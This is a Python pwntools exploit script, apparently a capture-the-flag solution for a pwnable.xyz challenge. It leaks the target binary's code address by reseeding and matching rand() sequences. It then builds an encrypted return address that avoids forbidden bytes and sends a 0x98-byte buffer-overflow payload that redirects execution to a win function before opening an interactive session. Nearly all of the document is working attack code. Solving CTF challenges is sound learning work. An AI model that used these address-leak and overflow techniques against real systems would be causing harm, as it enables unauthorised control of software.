###Get code base by reseeding and examining rand() sequence

from pwn import *
import subprocess

###Util
def reseed():
    r.sendlineafter('> ','1')

def encrypt(mes):
    r.sendlineafter('> ','2')
    r.sendlineafter('plaintext: ',mes)

def show():
    r.sendlineafter('> ','3')
    return r.recvline()[12:-1]

def leave():
    r.sendlineafter('> ','0')

def getrand():
    randnum = subprocess.getoutput('./genrand').strip().split('\n')
    for i in range(len(randnum)):
        randnum[i] = list(map(int,randnum[i].split(',')))
    return randnum

def check(target,randnum):
    for i in range(0x100):
        cnt = 0
        for j in range(10):
            if target[j]!=randnum[i][j]:
                break
            cnt+=1
        if cnt==10:
            return i

###Addr
win_offset = 0xad6

###Exploit
r = remote('svc.pwnable.xyz',30040)

###Get possible random sequence for each seed
randnum = getrand()

p_win_addr = [win_offset&0xff,-1,-1,-1,-1,-1,0,0]
sample = randnum[0][0]&0x7
while True:
    reseed()
    ###I'm a little paranoid, so examine 10 numbers in sequence to avoid collision, could be made shorter
    corpus = []
    for i in range(10):
        encrypt(b'\x01')
        corpus.append((show()[0]-1+0x100)%0x100)
        print(corpus)
    seed = check(corpus,randnum)
    p_win_addr[sample] = seed
    if -1 not in p_win_addr:
        break

    ###Find next unresolved byte to examine
    for i in range(10,50):
        if p_win_addr[randnum[seed][i]&0x7]==-1:
            sample = randnum[seed][i]&0x7
            for j in range(10,i):
                encrypt(b'\x01')
            break

print(hex(u64(b''.join(map(p8,p_win_addr)))))

###Find valid enc_byte such that encrypted win_addr wouldn't contain illegal bytes
cnt = 10
enc_byte = randnum[p_win_addr[sample]][cnt]
while p8(enc_byte) in p_win_addr or p8((enc_byte+0x10)%0x100) in p_win_addr:
    encrypt(b'\x01')
    cnt+=1
    enc_byte = randnum[p_win_addr[sample]][cnt]

c_win_addr = b''
for i in p_win_addr:
    c_win_addr+=p8((0x100+i-enc_byte)%0x100)
padding = b'a'*0x98
payload = padding+c_win_addr
encrypt(payload)
leave()
r.interactive()
